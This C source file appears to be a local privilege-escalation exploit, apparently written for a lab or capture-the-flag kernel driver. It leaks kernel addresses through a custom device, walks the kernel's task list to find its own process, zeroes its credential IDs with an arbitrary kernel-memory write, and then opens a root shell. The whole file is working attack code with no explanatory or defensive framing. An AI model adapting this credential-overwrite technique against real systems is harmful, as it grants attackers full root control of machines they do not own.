#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>

#include <kacmd.h>
#include <exp_commons.h>

#define TASK_PID 2184
#define TASK_NEXT 1928
#define TASK_CRED 2600
#define INIT_OFFSET 66816

char readbuff[TASK_CRED+40];

int main(){
    struct kacmd_info_params kip;
    struct kacmd_info_resp kir;
    unsigned long task_addr;
    unsigned long next_task;
    unsigned long cred_ptr;
    int pid = getpid(); 
    int kpid;
    kip.cmd = KACMD_INFO;

    init();

    write_dev(cmd, (char*)&kip, sizeof(kip), 0);
    read_dev(cmd, (char*)&kir, sizeof(kir), 0);
    printf("[I] Vpg: %p Ppg: %p Epg: %p\n", kir.pg_vaddress, kir.pg_paddress, kir.exec_paddress);
    printf("[I] code: %p data: %p bss: %p\n", kir.kernel_code, kir.kernel_data, kir.kernel_bss);
    task_addr = (unsigned long) kir.kernel_data + INIT_OFFSET;
    printf("[I] Init struct at %lx\n", task_addr);
    
    read_dev(vmem, readbuff, sizeof(readbuff), task_addr);
    kpid = *(int*)(readbuff+TASK_PID);
    next_task = *(unsigned long*)(readbuff + TASK_NEXT);
    printf("[I] task_struct of proc %d next task at: %lx\n", kpid, next_task);
    printf("[I] stack: %lx\n", *(unsigned long*)(readbuff + 16));
    printf("[I] credentials: %lx\n", *(unsigned long*)(readbuff + TASK_CRED));
    while (kpid != pid)
    {
        if (next_task == 0)
        {
            fprintf(stderr, "[E] something went wrong!\n");
            exit(1);
        }
        read_dev(vmem, readbuff, (TASK_CRED-TASK_NEXT)+sizeof(void*), next_task);
        kpid = *(int*)(readbuff+TASK_PID-TASK_NEXT);
        task_addr = next_task;
        next_task = *(unsigned long*)readbuff;
        //printf("[I] task_struct of proc %d next task at: %lx\n", kpid, next_task);
    }
    cred_ptr = *(unsigned long*)(readbuff+TASK_CRED-TASK_NEXT);


    printf("[I] found our credentials at: %lx proc: %d, address: %lx\n", cred_ptr, kpid, task_addr - TASK_NEXT);
    memset(readbuff, 0, 32);
    write_dev(vmem, readbuff, 32, cred_ptr+4);
    
    system("/bin/sh");
    
    fini();   

}
